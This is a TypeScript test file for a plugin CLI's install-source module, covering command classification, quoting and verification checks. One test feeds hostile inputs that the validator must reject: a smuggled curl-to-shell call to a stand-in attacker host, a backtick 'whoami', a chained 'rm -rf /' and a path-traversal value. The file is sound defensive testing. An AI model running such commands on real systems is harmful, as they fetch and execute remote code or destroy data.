import test from 'node:test'
import assert from 'node:assert/strict'
import { classifyInstallPath, formatInstallCommand, getInstallAvailability } from '../src/install-source.ts'

test('classifies a verified npm package command as installable', () => {
  assert.deepEqual(
    classifyInstallPath('dsh plugin --profile web add @scope/plugin@1.2.3'),
    { kind: 'npm', spec: '@scope/plugin@1.2.3' },
  )
})

test('classifies a GitHub subdirectory command as manual install', () => {
  assert.deepEqual(
    classifyInstallPath('dsh plugin --profile web add github:nexu-io/open-design#path:/packages/dsh-runtime'),
    { kind: 'github-subdir', spec: 'github:nexu-io/open-design#path:/packages/dsh-runtime' },
  )
})

test('accepts quoted source commands without changing the source boundary', () => {
  assert.deepEqual(
    classifyInstallPath("dsh plugin --profile web add 'github:Q00/ouroboros#main&path:integrations/dsh-plugin'"),
    { kind: 'github-subdir', spec: 'github:Q00/ouroboros#main&path:integrations/dsh-plugin' },
  )
})

test('classifies a verified GitHub repository command as manual install', () => {
  assert.deepEqual(
    classifyInstallPath('dsh plugin --profile web add github:owner/plugin'),
    { kind: 'manual', spec: 'github:owner/plugin' },
  )
})

test('formats validated manual commands with a safe canonical quoting style', () => {
  assert.equal(
    formatInstallCommand('github:Q00/ouroboros#main&path:integrations/dsh-plugin'),
    "dsh plugin --profile web add 'github:Q00/ouroboros#main&path:integrations/dsh-plugin'",
  )
  assert.equal(formatInstallCommand('@scope/plugin@1.2.3'), 'dsh plugin --profile web add @scope/plugin@1.2.3')
})

test('rejects shell syntax, URLs, and unsafe subdirectory paths', () => {
  assert.equal(classifyInstallPath('dsh plugin --profile web add https://example.test/plugin').kind, 'unsupported')
  assert.equal(classifyInstallPath('dsh plugin --profile web add github:owner/plugin#path:../outside').kind, 'unsupported')
  assert.equal(classifyInstallPath("dsh plugin --profile web add 'github:owner/plugin#$(curl https://attacker.test|sh)'").kind, 'unsupported')
  assert.equal(classifyInstallPath('dsh plugin --profile web add `whoami`').kind, 'unsupported')
  assert.equal(classifyInstallPath('dsh plugin --profile web add npm-package && rm -rf /').kind, 'invalid')
})

test('rejects missing and malformed verified commands', () => {
  assert.equal(classifyInstallPath(undefined).kind, 'invalid')
  assert.equal(classifyInstallPath('npm install package').kind, 'invalid')
  assert.equal(classifyInstallPath('dsh plugin --profile web add').kind, 'invalid')
})

test('requires both verification records for automatic npm installation', () => {
  assert.equal(getInstallAvailability('verified', 'runtime_verified', 'npm'), 'installable')
  assert.equal(getInstallAvailability('verified', 'unknown', 'npm'), 'conflict')
  assert.equal(getInstallAvailability('action_required', 'runtime_verified', 'npm'), 'conflict')
  assert.equal(getInstallAvailability('action_required', 'unknown', 'npm'), 'unverified')
})

test('allows a runtime-verified non-npm source as manual install', () => {
  assert.equal(getInstallAvailability('verified', 'runtime_verified', 'github-subdir'), 'manual')
  assert.equal(getInstallAvailability('action_required', 'runtime_verified', 'github-subdir'), 'manual')
  assert.equal(getInstallAvailability('verified', 'unknown', 'github-subdir'), 'conflict')
  assert.equal(getInstallAvailability('action_required', 'unknown', 'github-subdir'), 'unverified')
})
